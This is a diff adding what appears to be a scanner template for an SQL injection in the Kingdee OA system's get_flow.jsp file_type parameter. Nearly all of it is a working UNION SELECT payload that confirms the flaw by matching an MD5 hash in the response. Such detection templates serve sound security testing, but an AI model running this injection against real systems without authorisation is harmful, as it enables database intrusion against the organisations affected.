@@ -1,0 +1,18 @@
+id: Kingdee-sqli
+info:
+  author: Str1am
+  name: "Kingdee-OA\u7CFB\u7EDFget_flow.jsp\u6587\u4EF6file_type\u53C2\u6570sql\u6CE8\
+    \u5165"
+  severity: high
+  tags: Kingdee,sqli
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - 81dc9bdb52d04dc20036dbd8313ed055
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/kingdee/tree/tree/get_flow.jsp?ids=1&file_type=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--'
